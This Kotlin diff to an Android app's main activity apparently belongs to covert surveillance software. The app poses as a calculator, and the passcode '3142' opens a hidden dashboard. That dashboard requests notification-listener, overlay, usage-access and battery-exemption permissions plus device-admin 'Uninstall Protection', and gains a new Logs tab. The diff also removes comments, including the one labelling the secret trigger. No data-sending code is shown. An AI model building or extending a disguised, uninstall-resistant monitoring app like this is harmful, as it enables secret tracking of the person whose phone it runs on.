@@ -28,7 +28,13 @@ class MainActivity : AppCompatActivity() {
     private lateinit var dbHelper: DatabaseHelper
     private lateinit var logTextView: TextView
     private lateinit var calculatorLayout: LinearLayout
-    private lateinit var mainContentLayout: ScrollView
+    private lateinit var mainContentLayout: LinearLayout
+    
+    // Tab Containers
+    private lateinit var containerPermissions: ScrollView
+    private lateinit var containerLogs: LinearLayout
+    private lateinit var btnTabPermissions: Button
+    private lateinit var btnTabLogs: Button
     
     private lateinit var dpm: DevicePolicyManager
     private lateinit var adminComponent: ComponentName
@@ -64,9 +70,15 @@ class MainActivity : AppCompatActivity() {
         calculatorLayout = findViewById(R.id.calculatorLayout)
         mainContentLayout = findViewById(R.id.mainContentLayout)
         
+        containerPermissions = findViewById(R.id.containerPermissions)
+        containerLogs = findViewById(R.id.containerLogs)
+        btnTabPermissions = findViewById(R.id.btnTabPermissions)
+        btnTabLogs = findViewById(R.id.btnTabLogs)
+        
         dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
         adminComponent = ComponentName(this, AdminReceiver::class.java)
 
+        setupTabs()
         setupCalculator()
         setupDashboard()
         
@@ -80,9 +92,25 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        // Every time the user comes back to the app from Settings, refresh the ✅ and ❌
         if (mainContentLayout.visibility == View.VISIBLE) {
             updateDashboardUI()
+        }
+    }
+
+    private fun setupTabs() {
+        btnTabPermissions.setOnClickListener {
+            containerPermissions.visibility = View.VISIBLE
+            containerLogs.visibility = View.GONE
+            btnTabPermissions.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
+            btnTabLogs.backgroundTintList = getColorStateList(android.R.color.darker_gray)
+        }
+
+        btnTabLogs.setOnClickListener {
+            containerPermissions.visibility = View.GONE
+            containerLogs.visibility = View.VISIBLE
+            btnTabLogs.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
+            btnTabPermissions.backgroundTintList = getColorStateList(android.R.color.darker_gray)
+            refreshLogs()
         }
     }
 
@@ -143,7 +171,6 @@ class MainActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btnEquals).setOnClickListener {
             val text = display.text.toString()
 
-            // SECRET TRIGGER: Passcode "3142"
             if (text == "3142") {
                 calculatorLayout.visibility = View.GONE
                 mainContentLayout.visibility = View.VISIBLE
@@ -182,7 +209,6 @@ class MainActivity : AppCompatActivity() {
         btnAdmin = findViewById(R.id.btnAdmin)
         btnStartServices = findViewById(R.id.btnStartServices)
 
-        // CLICK LISTENERS TO OPEN SPECIFIC SETTINGS
         btnPermNotif.setOnClickListener { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) }
         
         btnPermOverlay.setOnClickListener {
@@ -245,28 +271,19 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // THE BRAINS OF THE DASHBOARD - Checks statuses and updates UI dynamically
     private fun updateDashboardUI() {
-        val colorRed = getColorStateList(android.R.color.holo_red_dark)
-        val colorGreen = getColorStateList(android.R.color.holo_green_dark)
-
-        // 1. Notification Listener
         val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
         updateBtn(btnPermNotif, notifEnabled, "Notification Access")
 
-        // 2. Overlay
         val overlayEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
         updateBtn(btnPermOverlay, overlayEnabled, "Display Over Other Apps")
 
-        // 3. Write Settings
         val writeEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(this) else true
         updateBtn(btnPermWrite, writeEnabled, "Modify System Settings")
 
-        // 4. Do Not Disturb
         val dndEnabled = (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).isNotificationPolicyAccessGranted
         updateBtn(btnPermDND, dndEnabled, "Do Not Disturb Access")
 
-        // 5. Usage Access
         val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
         val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
@@ -276,25 +293,21 @@ class MainActivity : AppCompatActivity() {
         }
         updateBtn(btnPermUsage, mode == AppOpsManager.MODE_ALLOWED, "Usage Data Access")
 
-        // 6. Battery
         val batteryEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             (getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
         } else true
         updateBtn(btnPermBattery, batteryEnabled, "Ignore Battery Optimization")
 
-        // 7. Alarms
         val alarmEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
             (getSystemService(Context.ALARM_SERVICE) as AlarmManager).canScheduleExactAlarms()
         } else true
         updateBtn(btnPermAlarm, alarmEnabled, "Exact Alarms")
 
-        // 8. Post Notifications
         val postEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
         } else true
         updateBtn(btnPermPost, postEnabled, "Post Notifications (A13+)")
 
-        // 9. Admin Protection
         updateBtn(btnAdmin, dpm.isAdminActive(adminComponent), "Uninstall Protection")
     }
 
